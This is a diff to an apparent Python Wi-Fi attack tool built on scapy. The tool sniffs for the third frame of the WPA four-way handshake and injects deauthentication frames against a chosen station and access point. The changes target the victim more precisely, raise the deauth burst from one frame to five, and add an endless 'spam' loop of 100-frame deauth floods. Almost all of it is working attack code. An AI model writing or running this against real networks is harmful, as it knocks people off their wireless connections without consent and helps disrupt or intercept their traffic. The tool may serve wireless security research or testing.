@@ -1,5 +1,6 @@
 from time import sleep
 
+import datetime
 from scapy.sendrecv import sniff
 from scapy.contrib.wpa_eapol import WPA_key
 from scapy.layers.dot11 import Dot11, Dot11Auth, RadioTap, Dot11AssoReq, EAPOL, Dot11Deauth
@@ -48,15 +49,18 @@ def sa_query_attack(interface, ap, sta):
 def ap_deauth(interface: MonitorInterface, ap: AP, sta: Station):
     def ap_deauth_cb(p):
         # https://digi.ninja/gawn_gold/4whsg.py
-        if p.haslayer(WPA_key) and p.addr3 == ap.bssid:
+        if p.haslayer(WPA_key) and p.addr3 == ap.bssid and p.addr1 == sta.mac_addr:
             layer = p.getlayer(WPA_key)
             key = layer.key_info
-            if key & WPA_KEY_INFO_MIC and key & WPA_KEY_INFO_INSTALL and key & WPA_KEY_INFO_ACK:
+            if key & WPA_KEY_INFO_MIC and key & WPA_KEY_INFO_INSTALL and key & WPA_KEY_INFO_ACK: # frame 3
                 cprint("Attacking {}!".format(p.addr1), 'red')
-                interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, burst_count=1, reason=3)
+                interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, burst_count=5, reason=3)
+
     return ap_deauth_cb
 
 
-def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station):
+def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam: bool = False):
+    while spam:
+        interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, count=100, reason=3)
     print("Waiting for EAPOL frame 3...")
     sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))
